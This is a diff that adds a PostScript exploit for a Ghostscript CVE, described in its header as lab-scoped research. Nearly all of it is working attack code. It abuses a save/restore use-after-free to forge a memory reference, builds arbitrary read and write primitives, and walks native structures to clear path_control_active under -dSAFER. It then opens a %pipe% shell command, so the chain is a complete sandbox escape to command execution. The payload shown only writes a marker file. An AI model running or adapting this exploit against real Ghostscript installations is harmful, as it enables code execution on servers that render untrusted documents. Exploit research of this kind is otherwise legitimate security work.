@@ -1,0 +1,112 @@
+%!PS
+% CVE-2026-125396 rung-5 attempt, lab scope: use the recovered .forceput /
+% save-restore UAF to forge a string ref over gs_lib_ctx.core->
+% path_control_active, clear it under -dSAFER, and open a %pipe% file running
+% a benign command whose side effect is checked by the caller. Restores the
+% field before quitting. No network, no application chain, no public target.
+%
+% Native offsets (gs 10.07.0, verified from ASan-build DWARF):
+%   gs_lib_ctx +8 = core (CORE below); core +156 = path_control_active
+%   (4-byte int). pipe_fopen (gdevpipe.c:89-97) validates %pipe% and | paths;
+%   gp_validate_path returns 0 as soon as path_control_active == 0
+%   (gpmisc.c:1049-1050).
+%
+% Paths arrive from the caller with -s (the lab app templates the saved upload
+% path); the defaults keep direct harness runs working.
+/GSFontPath systemdict /R5_FONT_PATH known
+  { systemdict /R5_FONT_PATH get }
+  { (/home/mesh-home/mishe-tauftauf2shell/lab/frontier/ghostscript2shell/harness/font-injected.pfa) } ifelse def
+/R5Marker systemdict /R5_MARKER_PATH known
+  { systemdict /R5_MARKER_PATH get } { (/tmp/gs2shell-r5-marker) } ifelse def
+
+/LoaderOriginalTypecheck errordict /typecheck get def
+errordict /typecheck {
+  userdict /LoaderTrapPhase known { userdict /LoaderTrapPhase get } { false } ifelse
+  { userdict /LoaderTrapPhase false put pop pop pop pop pop
+    userdict /ForceTarget get userdict /ForceKey get userdict /ForceValue get
+  } { LoaderOriginalTypecheck } ifelse
+} bind put
+userdict /QUIET true put
+userdict /ForceTarget systemdict put
+userdict /ForceKey /GS_R5_STALE put
+userdict /LoaderTrapPhase true put
+userdict /Fontmap 20 dict put
+userdict /Fontmap get /NimbusSans-Regular [ GSFontPath ] put
+/MARK 305419896 def
+/NARRS 96 def /ARRLEN 128 def /arrs NARRS array def
+/R5Save save def
+userdict /ForceValue 2048 string put
+{ /NimbusSans-Regular findfont pop } stopped pop
+R5Save restore
+systemdict /GS_R5_STALE known { systemdict /GS_R5_STALE get } { null } ifelse /sv exch def
+sv null eq { (NO_STALE_REF) = quit } if
+
+0 1 NARRS 1 sub { /ai exch def /a ARRLEN array def
+  0 1 ARRLEN 1 sub { /j exch def a j MARK put } for arrs ai a put } for
+/fpat -1 def
+0 1 sv length 4 sub { /p exch def
+  sv p get 120 eq { sv p 1 add get 86 eq { sv p 2 add get 52 eq {
+    sv p 3 add get 18 eq { /fpat p def exit } if } if } if } if } for
+fpat -1 eq { (NO_MARKER) = quit } if
+/base fpat 8 sub def
+/savebytes { /cnt exch def /off exch def /an exch def
+  0 1 cnt 1 sub { /k exch def userdict an k sv off k add get put } for } bind def
+/putbytes { /cnt exch def /off exch def /an exch def
+  0 1 cnt 1 sub { /k exch def sv off k add an k get put } for } bind def
+/readbytes4 { /o exch def /s exch def /v 0 def /m 1 def
+  0 1 3 { /k exch def /v v s o k add get m mul add def /m m 256 mul def } for v } bind def
+/readbytes64 { /o exch def /s exch def /v 0 def /m 1 def
+  0 1 7 { /k exch def /v v s o k add get m mul add def /m m 256 mul def } for v } bind def
+/write32s { /off exch def /p exch def /d 1 def
+  0 1 3 { /k exch def sv off k add p d idiv 255 and put /d d 256 mul def } for } bind def
+/write64s { /off exch def /p exch def /d 1 def
+  0 1 7 { /k exch def sv off k add p d idiv 255 and put /d d 256 mul def } for } bind def
+arrs 8 get 118 12345 put
+userdict /IH 8 array put userdict /IV 8 array put
+IH base 8 savebytes
+IV base 8 add 8 savebytes
+arrs 8 get 118 (ABCDEFGHIJKLMNOP) put
+userdict /SH 8 array put
+SH base 8 savebytes
+/mkview { /len exch def /addr exch def
+  SH base 8 putbytes len base 4 add write32s addr base 8 add write64s
+  arrs 8 get 118 get
+} bind def
+/readat8 { /addr exch def addr 8 mkview 0 readbytes64 } bind def
+arrs 8 get 118 currentdevice put
+sv base 8 add readbytes64 /DEVPTR exch def
+DEVPTR readat8 /GXDEVICE exch def
+GXDEVICE 24 add readat8 /MEM exch def
+MEM 208 add readat8 /LIBCTX exch def
+LIBCTX 8 add readat8 /CORE exch def
+CORE 156 add 4 mkview /PCPVIEW exch def
+PCPVIEW 0 readbytes4 /PC_BEFORE exch def
+(PATH_CONTROL_BYTES_BEFORE=) print PC_BEFORE == flush
+
+% Clear path_control_active through the forged ref.
+PCPVIEW 0 0 put PCPVIEW 1 0 put PCPVIEW 2 0 put PCPVIEW 3 0 put
+(PATH_CONTROL_BYTES_AFTER=) print PCPVIEW 0 readbytes4 == flush
+
+
+/R5_PRE (%pipe%/bin/sh -c "echo GS_R5_OK > ) def
+/R5_POST (") def
+/R5_CMD R5_PRE length R5Marker length R5_POST length add add string def
+R5_CMD 0 R5_PRE putinterval
+R5_CMD R5_PRE length R5Marker putinterval
+R5_CMD R5_PRE length R5Marker length add R5_POST putinterval
+{ R5_CMD (r) file /PFILE exch def
+  (PIPE_OPENED=true) = flush
+  PFILE 64 string readline { (PIPE_LINE=) print == flush } if
+  PFILE closefile
+} stopped { pop (PIPE_FAILED=true) = flush } if
+
+% Restore native state and the aliased slot.
+PCPVIEW 0 PC_BEFORE 255 and put
+PCPVIEW 1 PC_BEFORE 256 idiv 255 and put
+PCPVIEW 2 PC_BEFORE 65536 idiv 255 and put
+PCPVIEW 3 PC_BEFORE 16777216 idiv 255 and put
+(PATH_CONTROL_BYTES_RESTORED=) print PCPVIEW 0 readbytes4 == flush
+IH base 8 putbytes
+IV base 8 add 8 putbytes
+(CLEAN_VALUE=) print arrs 8 get 118 get == flush
+quit
